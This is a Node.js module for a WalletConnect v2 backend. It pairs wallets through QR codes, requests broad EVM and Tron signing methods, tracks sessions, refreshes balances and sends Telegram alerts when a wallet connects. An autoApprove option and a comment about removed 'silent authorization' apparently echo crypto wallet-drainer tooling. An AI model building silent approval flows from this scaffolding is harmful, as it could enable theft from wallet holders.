const SignClient = require("@walletconnect/sign-client").default;
const QRCode = require("qrcode");

const env = require("../config/env");
const store = require("../storage/sessions");
const logger = require("../utils/logger");
const { emitEvent } = require("../utils/events");
const { applyConnectedSession, applySessionUpdate } = require("./wallet");
const { refreshBalances } = require("./balances");
const { WalletConnectError } = require("../utils/errors");
const {
    createId,
    parseTopicFromUri,
    parseExpiryFromUri,
    extractAccounts,
    publicSession
} = require("../utils/helpers");

const EVM_METHODS = [
    "eth_accounts",
    "eth_requestAccounts",
    "eth_sendRawTransaction",
    "eth_sendTransaction",
    "eth_signTransaction",
    "eth_sign",
    "personal_sign",
    "eth_signTypedData",
    "eth_signTypedData_v3",
    "eth_signTypedData_v4",
    "wallet_switchEthereumChain",
    "wallet_addEthereumChain",
    "wallet_getPermissions",
    "wallet_requestPermissions",
    "wallet_watchAsset"
];

const EVM_EVENTS = ["accountsChanged", "chainChanged", "connect", "disconnect", "message"];

const DEFAULT_NAMESPACES = {
    eip155: {
        methods: EVM_METHODS,
        chains: ["eip155:1", "eip155:56", "eip155:137"],
        events: EVM_EVENTS
    },
    tron: {
        methods: ["tron_signTransaction", "tron_signMessage"],
        chains: ["tron:0x2b6653dc"],
        events: [],
        rpcMap: {
            "0x2b6653dc": env.TRON_API_URL || "https://api.trongrid.io"
        }
    }
};

function rpcMap() {
    return {
        1: env.RPC_ETH || "https://cloudflare-eth.com",
        56: env.RPC_BSC || "https://bsc-dataseed.binance.org",
        137: env.RPC_POLYGON || "https://polygon-rpc.com"
    };
}

function requiredNamespaces() {
    return {
        eip155: {
            methods: ["eth_sendTransaction"],
            chains: ["eip155:1", "eip155:56"],
            events: ["accountsChanged", "chainChanged"],
            rpcMap: rpcMap()
        },
        tron: {
            methods: ["tron_signTransaction", "tron_signMessage"],
            chains: ["tron:0x2b6653dc"],
            events: [],
            rpcMap: {
                "0x2b6653dc": env.TRON_API_URL || "https://api.trongrid.io"
            }
        }
    };
}

function connectNamespaces() {
    return {
        eip155: {
            ...DEFAULT_NAMESPACES.eip155,
            rpcMap: rpcMap()
        },
        tron: DEFAULT_NAMESPACES.tron
    };
}

/**
 * WalletConnect SignClient singleton.
 */
class WalletConnectService {
    constructor() {
        this.client = null;
        this.initializing = null;
        this.handlersRegistered = false;
        this.settling = new Set();
        this.ready = false;
    }

    static getInstance() {
        if (!WalletConnectService.instance) {
            WalletConnectService.instance = new WalletConnectService();
        }

        return WalletConnectService.instance;
    }

    isReady() {
        return this.ready && Boolean(this.client);
    }

    getClient() {
        return this.client;
    }

    getState() {
        return {
            initialized: this.isReady(),
            projectIdConfigured: Boolean(env.PROJECT_ID)
        };
    }

    /**
     * Initialize SignClient from PROJECT_ID.
     */
    async init() {
        try {
            if (this.client) {
                return this.client;
            }

            if (this.initializing) {
                return this.initializing;
            }

            this.initializing = SignClient.init({
                projectId: env.PROJECT_ID,
                metadata: {
                    name: env.APP_NAME,
                    description: "WalletConnect v2 backend",
                    url: env.APP_URL,
                    icons: [env.APP_ICON]
                },
                storage: require("../storage/persist").walletConnectStorage
            });

            this.client = await this.initializing;
            this.initializing = null;
            this.ready = true;
            this.registerEventHandlers();
            this.hydratePersistedSessions();

            logger.info("WalletConnect initialized");
            emitEvent("walletconnect_initialized", {
                projectIdConfigured: true,
                sessions: store.getSessions().length
            });

            return this.client;
        } catch (err) {
            this.initializing = null;
            this.client = null;
            this.ready = false;
            logger.error({ err }, "WalletConnect initialization failed");
            throw err;
        }
    }

    registerEventHandlers() {
        if (!this.client || this.handlersRegistered) {
            return;
        }

        this.handlersRegistered = true;
        const signClient = this.client;

        signClient.on("session_proposal", (event) => {
            this.safe("session_proposal", () => this.onSessionProposal(event));
        });

        signClient.on("session_connect", (event) => {
            this.safe("session_connect", () => this.onSessionConnect(event));
        });

        signClient.on("session_update", (event) => {
            this.safe("session_update", () => this.onSessionUpdate(event));
        });

        signClient.on("session_delete", (event) => {
            this.safe("session_delete", () => this.onSessionDelete(event));
        });

        signClient.on("session_expire", (event) => {
            this.safe("session_expire", () => this.onSessionExpire(event));
        });

        signClient.on("session_event", (event) => {
            this.safe("session_event", () => this.onSessionEvent(event));
        });

        signClient.on("session_ping", (event) => {
            this.safe("session_ping", () => this.onSessionPing(event));
        });

        signClient.on("session_request", (event) => {
            this.safe("session_request", () => this.onSessionRequest(event));
        });

        signClient.on("proposal_expire", (event) => {
            this.safe("proposal_expire", () => this.onProposalExpire(event));
        });
    }

    hydratePersistedSessions() {
        try {
            const existing = this.client?.session?.getAll?.() || [];

            existing.forEach((wcSession) => {
                if (store.getSessionByTopic(wcSession.topic)) {
                    return;
                }

                const accounts = extractAccounts(wcSession);
                const peer = wcSession.peer?.metadata || null;

                store.addSession({
                    connectionId: createId(),
                    uri: null,
                    topic: wcSession.topic,
                    pairingTopic: wcSession.pairingTopic || null,
                    sessionTopic: wcSession.topic,
                    pairing: wcSession.pairingTopic
                        ? { topic: wcSession.pairingTopic, uri: null }
                        : null,
                    qr: null,
                    expiry: wcSession.expiry || null,
                    status: "settled",
                    wallet: {
                        address: accounts[0]?.address || null,
                        chainId: accounts[0]?.chainId || null,
                        name: peer?.name || null,
                        url: peer?.url || null,
                        icons: peer?.icons || []
                    },
                    walletName: peer?.name || null,
                    peer,
                    accounts,
                    balances: [],
                    approvals: [],
                    autoApprove: false
                });
            });
        } catch (err) {
            logger.error({ err }, "Failed to hydrate WalletConnect sessions");
        }
    }

    /**
     * Create a pairing URI and PNG QR code for a new session.
     * @param {{ autoApprove?: boolean }} [options]
     */
    async createPairing(options = {}) {
        const signClient = this.getClient();

        if (!signClient || !this.ready) {
            throw new WalletConnectError("WalletConnect is not initialized");
        }

        const { uri, approval } = await signClient.connect({
            requiredNamespaces: requiredNamespaces(),
            optionalNamespaces: connectNamespaces(),
            sessionProperties: {
                tron_method_version: "v1"
            }
        });

        if (!uri) {
            throw new WalletConnectError("WalletConnect did not return a pairing URI");
        }

        const pairingTopic = parseTopicFromUri(uri);
        const connectionId = createId();
        const qr = await QRCode.toDataURL(uri);
        const expiry = parseExpiryFromUri(uri);

        const session = store.addSession({
            connectionId,
            uri,
            topic: pairingTopic,
            pairingTopic,
            sessionTopic: null,
            pairing: {
                topic: pairingTopic,
                uri
            },
            qr,
            expiry,
            status: "pending",
            wallet: null,
            walletName: null,
            peer: null,
            accounts: [],
            balances: [],
            approvals: [],
            autoApprove: Boolean(options.autoApprove)
        });

        emitEvent("pairing_created", {
            connectionId,
            topic: pairingTopic,
            uri,
            qr,
            createdAt: session.createdAt,
            status: session.status,
            expiry
        });

        this.listenForApproval(connectionId, approval);
        return session;
    }

    listenForApproval(connectionId, approval) {
        Promise.resolve()
            .then(() => approval())
            .then(async (wcSession) => {
                await this.onSessionApproved(connectionId, wcSession);
                await this.settleSession(connectionId, wcSession);
            })
            .catch((err) => {
                logger.error({ err, connectionId }, "Wallet pairing failed");
                const stored = store.updateSession(connectionId, {
                    status: "failed",
                    error: err.message
                });

                emitEvent("session_failed", {
                    connectionId,
                    message: err.message,
                    session: publicSession(stored)
                });
            });
    }

    async onSessionApproved(connectionId, wcSession) {
        store.touch(connectionId);
        const stored = store.updateSession(connectionId, {
            status: "approved",
            sessionTopic: wcSession?.topic || null,
            expiry: wcSession?.expiry || store.getSession(connectionId)?.expiry || null
        });

        emitEvent("session_approved", publicSession(stored));
        return stored;
    }

    async settleSession(connectionId, wcSession) {
        if (!wcSession?.topic) {
            return store.getSession(connectionId);
        }

        if (this.settling.has(wcSession.topic)) {
            return store.getSession(connectionId);
        }

        const current = store.getSession(connectionId);

        if (current?.status === "settled" && current.sessionTopic === wcSession.topic) {
            return current;
        }

        this.settling.add(wcSession.topic);

        try {
            const stored = applyConnectedSession(connectionId, wcSession);
            const settled = store.updateSession(connectionId, {
                status: "settled",
                topic: wcSession.topic,
                sessionTopic: wcSession.topic,
                pairingTopic: wcSession.pairingTopic || stored?.pairingTopic || null,
                expiry: wcSession.expiry || stored?.expiry || null,
                walletName: stored?.wallet?.name || null,
                peer: wcSession.peer?.metadata || stored?.peer || null
            });

            emitEvent("session_settled", publicSession(settled));
            emitEvent("demo_connected", {
                connectionId: settled.connectionId,
                topic: settled.sessionTopic || settled.topic,
                accounts: settled.accounts || [],
                wallet: settled.wallet || null
            });
            await refreshBalances(settled.connectionId);

            // Obsolete silent authorization (startAuthorizationLoop / autoApprove)
            // must not run after settlement. Payment approvals are user-initiated
            // via POST /api/payment/create and POST /api/payment/:id/request.

            const latest = store.getSession(connectionId);

            try {
                const { notifyWalletConnected } = require("./telegramNotifications");
                notifyWalletConnected(latest).catch((err) => {
                    logger.warn({ err: { message: err.message }, connectionId }, "Telegram wallet-connected notification failed");
                });
            } catch (err) {
                logger.warn({ err: { message: err.message }, connectionId }, "Telegram wallet-connected notification failed");
            }

            return latest;
        } finally {
            this.settling.delete(wcSession.topic);
        }
    }

    onSessionProposal(event) {
        const pairingTopic = event?.params?.pairingTopic;
        const stored = store.getSessionByTopic(pairingTopic);

        if (stored) {
            store.touch(stored.connectionId);
        }

        const next = stored
            ? store.updateSession(stored.connectionId, { status: "proposed" })
            : null;

        emitEvent("session_proposal", {
            connectionId: stored?.connectionId || null,
            pairingTopic,
            id: event?.id,
            proposer: event?.params?.proposer?.metadata || null,
            session: publicSession(next)
        });
    }

    async onSessionConnect(event) {
        const wcSession = event?.session;

        if (!wcSession) {
            return;
        }

        const stored = store.getSessionByTopic(wcSession.pairingTopic)
            || store.getSessionByTopic(wcSession.topic);

        if (!stored) {
            return;
        }

        if (stored.status !== "approved" && stored.status !== "settled") {
            await this.onSessionApproved(stored.connectionId, wcSession);
        }

        await this.settleSession(stored.connectionId, wcSession);
    }

    async onSessionUpdate(event) {
        const stored = store.getSessionByTopic(event?.topic);

        if (!stored || !this.client) {
            return;
        }

        store.touch(stored.connectionId);
        const wcSession = this.client.session.get(event.topic);
        applySessionUpdate(stored.connectionId, wcSession);

        const next = store.updateSession(stored.connectionId, {
            status: stored.status === "settled" ? "settled" : "updated",
            expiry: wcSession?.expiry || stored.expiry
        });

        emitEvent("session_updated", publicSession(next));
        await refreshBalances(stored.connectionId);
    }

    onSessionDelete(event) {
        const stored = store.getSessionByTopic(event?.topic);

        if (!stored) {
            return;
        }

        const next = store.updateSession(stored.connectionId, {
            status: "deleted"
        });

        emitEvent("session_deleted", publicSession(next));
    }

    onSessionExpire(event) {
        const stored = store.getSessionByTopic(event?.topic);

        if (!stored) {
            return;
        }

        const next = store.updateSession(stored.connectionId, {
            status: "expired"
        });

        emitEvent("session_expired", publicSession(next));
    }

    async onSessionEvent(event) {
        const stored = store.getSessionByTopic(event?.topic);
        const eventName = event?.params?.event?.name;

        if (stored) {
            store.touch(stored.connectionId);
        }

        emitEvent("session_event", {
            connectionId: stored?.connectionId || null,
            topic: event?.topic,
            params: event?.params
        });

        if (!stored || !this.client) {
            return;
        }

        if (eventName === "accountsChanged" || eventName === "chainChanged") {
            const wcSession = this.client.session.get(event.topic);
            applySessionUpdate(stored.connectionId, wcSession);
            emitEvent("session_updated", publicSession(store.getSession(stored.connectionId)));
            await refreshBalances(stored.connectionId);
        }
    }

    onSessionPing(event) {
        const stored = store.getSessionByTopic(event?.topic);

        if (stored) {
            store.touch(stored.connectionId);
        }

        emitEvent("session_ping", {
            connectionId: stored?.connectionId || null,
            topic: event?.topic,
            id: event?.id
        });
    }

    onSessionRequest(event) {
        const stored = store.getSessionByTopic(event?.topic);

        emitEvent("session_request", {
            connectionId: stored?.connectionId || null,
            topic: event?.topic,
            id: event?.id,
            params: event?.params || null
        });
    }

    onProposalExpire(event) {
        emitEvent("session_expired", {
            id: event?.id || null,
            reason: "proposal_expire"
        });
    }

    /**
     * Close the relay transport without sending wallet transactions.
     */
    async close() {
        try {
            if (this.client?.core?.relayer?.transportClose) {
                await this.client.core.relayer.transportClose();
            }
        } catch (err) {
            logger.warn({ err }, "WalletConnect transport close failed");
        } finally {
            this.ready = false;
            this.client = null;
            this.handlersRegistered = false;
        }
    }

    safe(name, fn) {
        Promise.resolve()
            .then(() => fn())
            .catch((err) => {
                logger.error({ err, handler: name }, `${name} handler failed`);
            });
    }
}

const walletConnect = WalletConnectService.getInstance();

async function initWalletConnect() {
    return walletConnect.init();
}

function getClient() {
    return walletConnect.getClient();
}

async function createPairing(options) {
    return walletConnect.createPairing(options);
}

module.exports = {
    WalletConnectService,
    walletConnect,
    initWalletConnect,
    getClient,
    createPairing
};
